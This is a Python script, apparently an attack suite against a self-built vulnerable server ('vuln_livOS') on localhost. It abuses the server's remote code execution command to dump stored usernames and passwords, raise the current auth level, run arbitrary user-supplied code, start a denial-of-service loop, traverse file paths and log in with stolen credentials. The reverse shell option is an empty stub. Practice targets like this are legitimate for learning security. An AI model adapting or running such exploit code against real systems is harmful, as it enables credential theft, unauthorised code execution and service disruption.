import socket
import time
import ast

HOST = '127.0.0.1'
PORT = 54321

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

def exeres(code:str,client_socket):
    client_socket.settimeout(1)
    client_socket.sendall("exe".encode())
    d=client_socket.recv(1024).decode()
    client_socket.sendall(code.encode())
    try:
        respones = client_socket.recv(1024).decode()  # Response to code
        return respones
    except socket.timeout:
        print("Timeout.")
        return None
    
def exe(code:str,client_socket):
    client_socket.settimeout(1)
    client_socket.sendall("exe".encode())
    d=client_socket.recv(1024).decode()
    client_socket.sendall(code.encode())
    

def stealer(client_socket):
    
    # Receive the first response (user)
    user = exeres('client_sok.sendall(users[0].encode())',client_socket)

    password = exeres('client_sok.sendall(paswords[0].encode())',client_socket)

    return user, password

def finder(client_socket,lev:int):
    
    # Receive the first response (user)
    users = exeres('client_sok.sendall(str(users).encode())',client_socket)
    users = ast.literal_eval(users)

    passwords = exeres('client_sok.sendall(str(paswords).encode())',client_socket)
    passwords = ast.literal_eval(passwords)

    auths=exeres('client_sok.sendall(str(auths).encode())',client_socket)
    auths=list(ast.literal_eval(auths))

    print(users,passwords,auths)

    try:
        id=auths.index(lev)
    except:
        print("could not find auth level in auths")
        return

    user=users[id]
    password=passwords[id]

    



    return user, password

def privilege_escalation(client_socket):
    lev = int(input("Which auth level would you like (0-âˆž)? 0=better: "))
    
    # Set curauth on the server
    print(f"setting auth to {lev}")
    exe(f"curauth = {lev}", client_socket)
    
    print("Fetching curauth...")
    # Fetch curauth from the server and print it
    response = exeres('client_sok.sendall(str(curauth).encode())', client_socket)
    print(f"Current auth level: {response}")

def reverse_shell(client_socket):
    pass

def path_traversal(client_socket):
    path=input("were do you want to go to starting path is: C:/Users/Levi/Documents/GitHub/network_stuff/exploits/vuln_livOS/files\n")
    client_socket.sendall("files".encode())
    d=client_socket.recv(1024).decode()
    d=client_socket.recv(1024).decode()
    client_socket.sendall(path.encode())
    print(client_socket.recv(1024).decode())
    d=client_socket.recv(1024).decode()
    client_socket.sendall("-1".encode())
    d=client_socket.recv(1024).decode()
    d=client_socket.recv(1024).decode()
    client_socket.sendall("-1".encode())
    d=client_socket.recv(1024).decode()

def dos(client_socket):
    exe("while True: pass",client_socket)


    

def auto_login(client_socket):
    user, pas = stealer(client_socket)
    client_socket.sendall("login".encode())
    d=client_socket.recv(1024).decode()
    client_socket.sendall(user.encode())
    d=client_socket.recv(1024).decode()
    client_socket.sendall(pas.encode())
    print(client_socket.recv(1024).decode())



    

print("started atack suite for vuln_livOS")
try:
    while True:
        print("what atacks would your like to perform: \n"
              "1-login stealer \n"
              "2-priveleg escalation \n"
              "3-reverse shell \n"
              "4-run your own code \n"
              "5-dos\n"
              "6-server shutdonw\n"
              "7-path traversal\n"
              "8-auto login\n")
        
        ein=int(input(""))

        if ein==1:
            print(stealer(client_socket))
        elif ein == 2:
            privilege_escalation(client_socket)
        elif ein == 3:
            pass
        elif ein == 4:
            print(exeres(input("your py code here:"),client_socket))

        elif ein == 5:
            dos(client_socket)

        elif ein==7:
            path_traversal(client_socket)
        elif ein==8:
            auto_login(client_socket)
        elif ein==9:
            print(finder(client_socket,int(input("what auth level do you want to find:"))))

finally:
    client_socket.close()

